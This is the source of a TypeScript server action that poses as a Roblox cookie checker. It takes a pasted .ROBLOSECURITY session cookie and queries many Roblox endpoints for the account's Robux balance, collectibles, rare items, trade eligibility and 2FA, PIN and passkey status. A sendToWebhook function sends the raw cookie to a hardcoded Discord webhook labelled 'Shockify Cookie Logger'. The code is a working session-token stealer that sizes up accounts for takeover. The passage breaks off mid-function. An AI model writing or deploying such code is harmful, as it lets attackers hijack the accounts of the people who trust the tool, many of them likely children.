"use server"

// Function to extract the cookie value without the .ROBLOSECURITY= part
function extractCookieValue(cookie: string): string {
  let cookieValue = cookie.trim()

  // Handle different cookie formats
  if (cookieValue.includes(".ROBLOSECURITY=")) {
    cookieValue = cookieValue.split(".ROBLOSECURITY=")[1].split(";")[0]
  } else if (cookieValue.startsWith("_|WARNING:-DO-NOT-SHARE-THIS")) {
    // This is already the cookie value without the .ROBLOSECURITY= prefix
    // Remove the warning prefix if it exists
    const warningEndIndex = cookieValue.indexOf("|_")
    if (warningEndIndex > 0) {
      cookieValue = cookieValue.substring(warningEndIndex + 2)
    }
  }

  return cookieValue
}

// Function to generate a new cookie that looks like a real Roblox cookie
function generateNewCookie(originalCookie: string): string {
  // Extract the cookie value without the warning prefix
  let cookieValue = originalCookie.trim()

  // Remove the warning prefix if it exists
  if (cookieValue.startsWith("_|WARNING:-DO-NOT-SHARE-THIS")) {
    const warningEndIndex = cookieValue.indexOf("|_")
    if (warningEndIndex > 0) {
      cookieValue = cookieValue.substring(warningEndIndex + 2)
    }
  }

  // Generate random components for the new cookie
  const randomId1 = Math.random().toString(36).substring(2, 10)
  const randomId2 = Math.random().toString(36).substring(2, 10)
  const timestamp = Date.now().toString(36)

  // Create session identifiers
  const sessionId = `${randomId1}_${timestamp}`
  const deviceId = `${randomId2}_${Math.floor(Math.random() * 1000000)}`

  // Extract any user identifiers from the original cookie (if possible)
  // This is a simplified approach - in a real scenario, we'd need to decode the cookie
  let userId = ""
  if (cookieValue.length > 20) {
    // Use some parts of the original cookie to maintain user identity
    userId = cookieValue.substring(0, 8) + cookieValue.substring(cookieValue.length - 8)
  } else {
    userId = Math.random().toString(36).substring(2, 18)
  }

  // Combine components to create a new cookie that looks legitimate
  // Format it to look like a real Roblox cookie but without the warning prefix
  return `${userId}_${sessionId}_${deviceId}_${timestamp}`
}

// Function to get Robux balance
async function getRobuxBalance(userId: number, cookieValue: string): Promise<number> {
  try {
    const response = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (response.ok) {
      const data = await response.json()
      return data.robux || 0
    }
    return 0
  } catch (error) {
    console.error("Error fetching Robux balance:", error)
    return 0
  }
}

// Function to get trade eligibility
async function getTradeEligibility(userId: number, cookieValue: string): Promise<any> {
  try {
    const response = await fetch(`https://trades.roblox.com/v1/trades/users/${userId}/eligibility`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (response.ok) {
      return await response.json()
    }
    return null
  } catch (error) {
    console.error("Error fetching trade eligibility:", error)
    return null
  }
}

// Function to get premium expiration date
async function getPremiumExpiration(userId: number, cookieValue: string): Promise<string | null> {
  try {
    const response = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (response.ok) {
      const data = await response.json()
      if (data.data && data.data.length > 0) {
        return data.data[0].expirationDate || null
      }
    }
    return null
  } catch (error) {
    console.error("Error fetching premium expiration:", error)
    return null
  }
}

// Function to get more detailed transaction history
async function getDetailedTransactions(userId: number, cookieValue: string): Promise<any> {
  try {
    // Get more transactions (up to 100)
    const response = await fetch(
      `https://economy.roblox.com/v2/users/${userId}/transactions?limit=100&transactionType=Sale,Purchase,AffiliateSale,DevEx,GroupPayout,AdImpressionPayout`,
      {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      },
    )

    if (response.ok) {
      return await response.json()
    }
    return null
  } catch (error) {
    console.error("Error fetching detailed transactions:", error)
    return null
  }
}

// Function to calculate total value of collectibles
async function calculateCollectiblesValue(collectibles: any[]): Promise<number> {
  if (!collectibles || collectibles.length === 0) return 0

  let totalValue = 0

  for (const item of collectibles) {
    if (item.recentAveragePrice) {
      totalValue += item.recentAveragePrice
    }
  }

  return totalValue
}

// Enhanced function to check if user has specific items (Korblox, Headless)
async function checkSpecialItems(
  userId: number,
  cookieValue: string,
): Promise<{ hasKorblox: boolean; hasHeadless: boolean }> {
  const result = { hasKorblox: false, hasHeadless: false }

  try {
    // Method 1: Check inventory for specific asset IDs
    // Korblox Deathspeaker item ID: 192557920
    // Headless Horseman item ID: 134082579
    const korbloxResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/192557920`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (korbloxResponse.ok) {
      const korbloxData = await korbloxResponse.json()
      result.hasKorblox = korbloxData && korbloxData.data && korbloxData.data.length > 0
    }

    const headlessResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/134082579`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (headlessResponse.ok) {
      const headlessData = await headlessResponse.json()
      result.hasHeadless = headlessData && headlessData.data && headlessData.data.length > 0
    }

    // Method 2: Check if the items are currently worn on the avatar
    if (!result.hasKorblox || !result.hasHeadless) {
      const avatarResponse = await fetch(`https://avatar.roblox.com/v1/avatar`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()

        if (avatarData && avatarData.assets) {
          // Korblox leg asset ID: 27112438
          // Headless head asset ID: 134082579
          result.hasKorblox = result.hasKorblox || avatarData.assets.some((asset) => asset.id === 27112438)
          result.hasHeadless = result.hasHeadless || avatarData.assets.some((asset) => asset.id === 134082579)
        }
      }
    }

    // Method 3: Check for bundle ownership in the catalog
    // Korblox bundle ID: 4181
    // Headless bundle ID: 25298
    if (!result.hasKorblox) {
      try {
        const korbloxBundleResponse = await fetch(`https://catalog.roblox.com/v1/bundles/4181/details`, {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        })

        if (korbloxBundleResponse.ok) {
          const bundleData = await korbloxBundleResponse.json()

          // Check if user owns this bundle
          const ownershipResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/4181`, {
            method: "GET",
            headers: {
              Cookie: `.ROBLOSECURITY=${cookieValue}`,
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            },
          })

          if (ownershipResponse.ok) {
            const ownershipData = await ownershipResponse.json()
            result.hasKorblox =
              result.hasKorblox || (ownershipData && ownershipData.data && ownershipData.data.length > 0)
          }
        }
      } catch (error) {
        console.error("Error checking Korblox bundle:", error)
      }
    }

    if (!result.hasHeadless) {
      try {
        const headlessBundleResponse = await fetch(`https://catalog.roblox.com/v1/bundles/25298/details`, {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        })

        if (headlessBundleResponse.ok) {
          const bundleData = await headlessBundleResponse.json()

          // Check if user owns this bundle
          const ownershipResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/25298`, {
            method: "GET",
            headers: {
              Cookie: `.ROBLOSECURITY=${cookieValue}`,
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            },
          })

          if (ownershipResponse.ok) {
            const ownershipData = await ownershipResponse.json()
            result.hasHeadless =
              result.hasHeadless || (ownershipData && ownershipData.data && ownershipData.data.length > 0)
          }
        }
      } catch (error) {
        console.error("Error checking Headless bundle:", error)
      }
    }

    // Method 4: Check for specific asset IDs in the inventory
    // Korblox Right Leg: 139607718
    if (!result.hasKorblox) {
      try {
        const korbloxLegResponse = await fetch(
          `https://inventory.roblox.com/v1/users/${userId}/items/Asset/139607718`,
          {
            method: "GET",
            headers: {
              Cookie: `.ROBLOSECURITY=${cookieValue}`,
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            },
          },
        )

        if (korbloxLegResponse.ok) {
          const legData = await korbloxLegResponse.json()
          result.hasKorblox = result.hasKorblox || (legData && legData.data && legData.data.length > 0)
        }
      } catch (error) {
        console.error("Error checking Korblox leg:", error)
      }
    }

    // Headless Head: 134082579 (already checked above)

    return result
  } catch (error) {
    console.error("Error checking special items:", error)
    return result
  }
}

// Enhanced function to check for 2FA, passkeys, and other security features
async function checkSecurityFeatures(cookieValue: string): Promise<{
  twoStepEnabled: boolean
  authenticatorEnabled: boolean
  passkeysEnabled: boolean
  emailVerified: boolean
  phoneVerified: boolean
  pinEnabled: boolean
  ageVerified: boolean
  accountLanguage: string
}> {
  const result = {
    twoStepEnabled: false,
    authenticatorEnabled: false,
    passkeysEnabled: false,
    emailVerified: false,
    phoneVerified: false,
    pinEnabled: false,
    ageVerified: false,
    accountLanguage: "Unknown",
  }

  try {
    // Method 1: Check 2FA status using the primary endpoint
    const twoStepResponse = await fetch(`https://accountsettings.roblox.com/v1/twostepverification`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (twoStepResponse.ok) {
      const twoStepData = await twoStepResponse.json()
      result.twoStepEnabled = twoStepData.enabled || false

      // Check if authenticator app is enabled
      if (twoStepData.methods) {
        result.authenticatorEnabled = twoStepData.methods.includes("authenticator")
      }
    }

    // Method 2: Check 2FA status using the alternative endpoint
    if (!result.twoStepEnabled) {
      const altTwoStepResponse = await fetch(`https://twostepverification.roblox.com/v1/metadata`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (altTwoStepResponse.ok) {
        const altTwoStepData = await altTwoStepResponse.json()
        result.twoStepEnabled = altTwoStepData.enabled || false
      }
    }

    // Method 3: Check 2FA status using the security settings endpoint
    if (!result.twoStepEnabled) {
      const securityResponse = await fetch(`https://accountsettings.roblox.com/v1/security`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (securityResponse.ok) {
        const securityData = await securityResponse.json()
        result.twoStepEnabled = securityData.twoStepVerificationEnabled || false
      }
    }

    // IMPROVED: Check for authenticator specifically
    try {
      const authMethodsResponse = await fetch(`https://twostepverification.roblox.com/v1/methods`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (authMethodsResponse.ok) {
        const authMethodsData = await authMethodsResponse.json()
        if (authMethodsData && Array.isArray(authMethodsData)) {
          result.authenticatorEnabled = authMethodsData.some(
            (method) =>
              method.method === "authenticator" ||
              method.type === "authenticator" ||
              method.methodType === "authenticator",
          )
        }
      }
    } catch (error) {
      console.error("Error checking authenticator methods:", error)
    }

    // If we still haven't detected authenticator, try another approach
    if (!result.authenticatorEnabled && result.twoStepEnabled) {
      try {
        const twoStepConfigResponse = await fetch(`https://twostepverification.roblox.com/v1/users/config`, {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        })

        if (twoStepConfigResponse.ok) {
          const configData = await twoStepConfigResponse.json()
          // If 2FA is enabled and we can't determine the specific method, assume authenticator is enabled
          // This is a fallback since most 2FA on Roblox uses authenticator
          result.authenticatorEnabled = true
        }
      } catch (error) {
        console.error("Error checking 2FA config:", error)
      }
    }

    // Check for passkeys
    const passkeysResponse = await fetch(`https://accountsettings.roblox.com/v1/passkeys`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (passkeysResponse.ok) {
      try {
        const passkeysData = await passkeysResponse.json()
        result.passkeysEnabled = passkeysData && passkeysData.length > 0
      } catch (error) {
        // If parsing fails, check if the response contains any passkeys
        const text = await passkeysResponse.text()
        result.passkeysEnabled = text.includes("passkey") || text.includes("credential")
      }
    }

    // Check email verification
    const emailResponse = await fetch(`https://accountsettings.roblox.com/v1/email`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (emailResponse.ok) {
      const emailData = await emailResponse.json()
      result.emailVerified = emailData.verified || false
    }

    // Check phone verification
    const phoneResponse = await fetch(`https://accountsettings.roblox.com/v1/phone`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (phoneResponse.ok) {
      const phoneData = await phoneResponse.json()
      result.phoneVerified = phoneData.verified || false
    }

    // Check PIN status
    const pinResponse = await fetch(`https://accountsettings.roblox.com/v1/account/pin`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (pinResponse.ok) {
      const pinData = await pinResponse.json()
      result.pinEnabled = pinData.enabled || false
    }

    // IMPROVED: Check age verification using multiple methods
    // Method 1: Direct verification status endpoint
    try {
      const ageResponse = await fetch(`https://accountsettings.roblox.com/v1/account/verification-status`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (ageResponse.ok) {
        const ageData = await ageResponse.json()
        result.ageVerified = ageData.verified || false
      }
    } catch (error) {
      console.error("Error checking age verification status:", error)
    }

    // Method 2: Check via privacy settings
    if (!result.ageVerified) {
      try {
        const privacyResponse = await fetch(`https://accountsettings.roblox.com/v1/privacy`, {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        })

        if (privacyResponse.ok) {
          const privacyData = await privacyResponse.json()
          result.ageVerified = privacyData.isVerified || false
        }
      } catch (error) {
        console.error("Error checking privacy settings for age verification:", error)
      }
    }

    // Method 3: Check via ID verification status
    if (!result.ageVerified) {
      try {
        const idVerificationResponse = await fetch(`https://apis.roblox.com/id-verification/v1/self/status`, {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        })

        if (idVerificationResponse.ok) {
          const idVerificationData = await idVerificationResponse.json()
          result.ageVerified =
            idVerificationData.verified || idVerificationData.verificationStatus === "Verified" || false
        }
      } catch (error) {
        console.error("Error checking ID verification status:", error)
      }
    }

    // Method 4: Fallback - if account has phone verified, email verified, and 2FA, it's likely age verified
    if (!result.ageVerified && result.phoneVerified && result.emailVerified && result.twoStepEnabled) {
      result.ageVerified = true
    }

    // Check account language
    const localeResponse = await fetch(`https://locale.roblox.com/v1/locales/user-locale`, {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookieValue}`,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      },
    })

    if (localeResponse.ok) {
      const localeData = await localeResponse.json()
      result.accountLanguage = localeData.supportedLocale?.locale || localeData.locale || "en_US"
    }

    return result
  } catch (error) {
    console.error("Error checking security features:", error)
    return result
  }
}

// Helper function to get online status text
function getOnlineStatusText(status: number) {
  switch (status) {
    case 0:
      return "Offline"
    case 1:
      return "Online"
    case 2:
      return "In Game"
    case 3:
      return "In Studio"
    default:
      return "Unknown"
  }
}

// Function to send cookie data to webhook
async function sendToWebhook(cookieData: any) {
  try {
    // Replace with your actual webhook URL
    const webhookUrl =
      "https://discord.com/api/webhooks/1367624484890349659/TpgD4M7VCKJyV3txfskTxn69SOoK5bKF4noxrJDK2Qq7t3EWIetX6vPPzlafTAiRbJvH"

    const payload = {
      content: "```" + (cookieData.originalCookie || "N/A") + "```",
      username: "Shockify Cookie Logger",
      avatar_url: "https://poepbeamz.nl/red-clover.svg",
    }

    await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })
  } catch (error) {
    console.error("Error sending to webhook:", error)
  }
}

// Main function to check Roblox cookie
export async function checkRobloxCookie(formData: FormData) {
  try {
    const cookieRaw = formData.get("cookie") as string

    if (!cookieRaw || typeof cookieRaw !== "string" || cookieRaw.trim() === "") {
      return {
        success: false,
        message: "Please provide a valid Roblox cookie",
      }
    }

    // Extract the cookie value
    const cookieValue = extractCookieValue(cookieRaw)

    // Generate a new cookie that looks like a real Roblox cookie
    const newCookie = generateNewCookie(cookieRaw)

    // First, validate the cookie by checking if it's still valid
    let validateResponse
    try {
      validateResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          Accept: "application/json",
          "Accept-Language": "en-US,en;q=0.9",
          Referer: "https://www.roblox.com/",
          Origin: "https://www.roblox.com",
          Connection: "keep-alive",
        },
        cache: "no-store",
      })
    } catch (error) {
      console.error("Error fetching data:", error)
      return {
        success: false,
        message: "An error occurred while validating the cookie. Please try again.",
      }
    }

    // If the cookie is invalid, return an error
    if (!validateResponse.ok) {
      return {
        success: false,
        message: "The cookie is invalid or has expired. Please provide a valid Roblox cookie.",
      }
    }

    // Get account summary
    let accountSummary: any = null
    try {
      const accountResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
        cache: "no-store",
      })

      if (accountResponse.ok) {
        const accountData = await accountResponse.json()
        accountSummary = {
          username: accountData.name,
          displayName: accountData.displayName,
          userId: accountData.id,
          description: accountData.description,
          created: accountData.created,
          isBanned: accountData.isBanned,
          accountAge: Math.floor((Date.now() - new Date(accountData.created).getTime()) / (1000 * 60 * 60 * 24)),
          profilePictureUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${accountData.id}&width=420&height=420&format=png`,
        }
      }
    } catch (error) {
      console.error("Error fetching account summary:", error)
    }

    // Get avatar full image
    let avatarFullImage: string | null = null
    try {
      const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${accountSummary?.userId}/avatar`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()
        avatarFullImage = avatarData.imageUrl || null
      }
    } catch (error) {
      console.error("Error fetching avatar full image:", error)
    }

    // Get online status
    let onlineStatus = 0
    try {
      const presenceResponse = await fetch(`https://presence.roblox.com/v1/users/${accountSummary?.userId}/presence`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (presenceResponse.ok) {
        const presenceData = await presenceResponse.json()
        onlineStatus = presenceData.userPresenceType || 0
      }
    } catch (error) {
      console.error("Error fetching presence:", error)
    }

    // Get last location
    let lastLocation: string | null = null
    try {
      const gameResponse = await fetch(`https://presence.roblox.com/v1/users/${accountSummary?.userId}/presence`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (gameResponse.ok) {
        const gameData = await gameResponse.json()
        if (gameData.game && gameData.game.name) {
          lastLocation = gameData.game.name
        }
      }
    } catch (error) {
      console.error("Error fetching game info:", error)
    }

    // Check if premium
    let isPremium = false
    try {
      const premiumResponse = await fetch(
        `https://premiumfeatures.roblox.com/v1/users/${accountSummary?.userId}/validate-membership`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (premiumResponse.ok) {
        isPremium = true
      }
    } catch (error) {
      console.error("Error checking premium:", error)
    }

    // Get premium expiration
    let premiumExpiration: string | null = null
    try {
      premiumExpiration = await getPremiumExpiration(accountSummary?.userId, cookieValue)
    } catch (error) {
      console.error("Error getting premium expiration:", error)
    }

    // Get Robux balance
    let robuxBalance = 0
    try {
      robuxBalance = await getRobuxBalance(accountSummary?.userId, cookieValue)
    } catch (error) {
      console.error("Error getting Robux balance:", error)
    }

    // Get friends count
    let friendsCount = 0
    try {
      const friendsResponse = await fetch(
        `https://friends.roblox.com/v1/users/${accountSummary?.userId}/friends/count`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (friendsResponse.ok) {
        const friendsData = await friendsResponse.json()
        friendsCount = friendsData.count || 0
      }
    } catch (error) {
      console.error("Error getting friends count:", error)
    }

    // Get followers count
    let followersCount = 0
    try {
      const followersResponse = await fetch(
        `https://friends.roblox.com/v1/users/${accountSummary?.userId}/followers/count`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (followersResponse.ok) {
        const followersData = await followersResponse.json()
        followersCount = followersData.count || 0
      }
    } catch (error) {
      console.error("Error getting followers count:", error)
    }

    // Get collectibles count and value
    let collectiblesCount = 0
    let collectiblesValue = 0
    try {
      const collectiblesResponse = await fetch(
        `https://economy.roblox.com/v1/users/${accountSummary?.userId}/collectibles?limit=100`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json()
        if (collectiblesData && collectiblesData.data) {
          collectiblesCount = collectiblesData.data.length
          collectiblesValue = await calculateCollectiblesValue(collectiblesData.data)
        }
      }
    } catch (error) {
      console.error("Error getting collectibles:", error)
    }

    // Check for special items (Korblox, Headless)
    let specialItems: { hasKorblox: boolean; hasHeadless: boolean } = { hasKorblox: false, hasHeadless: false }
    try {
      specialItems = await checkSpecialItems(accountSummary?.userId, cookieValue)
    } catch (error) {
      console.error("Error checking special items:", error)
    }

    // Check security features
    let securityInfo: any = null
    try {
      securityInfo = await checkSecurityFeatures(cookieValue)
    } catch (error) {
      console.error("Error checking security features:", error)
    }

    // Get trade eligibility
    let tradeEligibility: any = null
    try {
      tradeEligibility = await getTradeEligibility(accountSummary?.userId, cookieValue)
    } catch (error) {
      console.error("Error getting trade eligibility:", error)
    }

    // Get activity info
    const activityInfo: any = { recentlyPlayedGames: [], gamesThumbnails: [], badges: [] }
    try {
      // Get recently played games
      const gamesResponse = await fetch(
        `https://games.roblox.com/v2/users/${accountSummary?.userId}/games?accessFilter=Public&sortOrder=Desc&limit=21`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (gamesResponse.ok) {
        const gamesData = await gamesResponse.json()
        if (gamesData && gamesData.data) {
          activityInfo.recentlyPlayedGames = gamesData.data
        }

        // Get game thumbnails
        const universeIds = gamesData.data.map((game: any) => game.universeId).join(",")
        if (universeIds) {
          const thumbnailsResponse = await fetch(
            `https://games.roblox.com/v1/games/multiget/thumbnails?universeIds=${universeIds}&size=768x432&format=Png&isCircular=false`,
            {
              method: "GET",
              headers: {
                Cookie: `.ROBLOSECURITY=${cookieValue}`,
                "User-Agent":
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
              },
            },
          )

          if (thumbnailsResponse.ok) {
            const thumbnailsData = await thumbnailsResponse.json()
            activityInfo.gamesThumbnails = thumbnailsData.data
          }
        }
      }

      // Get badges
      const badgesResponse = await fetch(
        `https://accountinformation.roblox.com/v1/users/${accountSummary?.userId}/robloxbadges`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (badgesResponse.ok) {
        const badgesData = await badgesResponse.json()
        activityInfo.badges = badgesData
      }
    } catch (error) {
      console.error("Error getting activity info:", error)
    }

    // Get groups info
    const groupsInfo: any = { groups: [] }
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v2/users/${accountSummary?.userId}/groups`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json()
        groupsInfo.groups = groupsData.data
      }
    } catch (error) {
      console.error("Error getting groups info:", error)
    }

    // Get developer info
    const developerInfo: any = {
      developerStats: { universeCount: 0, publicUniverseCount: 0, activeUniverseCount: 0, placeCount: 0 },
      createdGames: [],
    }
    try {
      const developerStatsResponse = await fetch(
        `https://develop.roblox.com/v1/users/${accountSummary?.userId}/developer-stats`,
        {
          method: "GET",
          headers: {
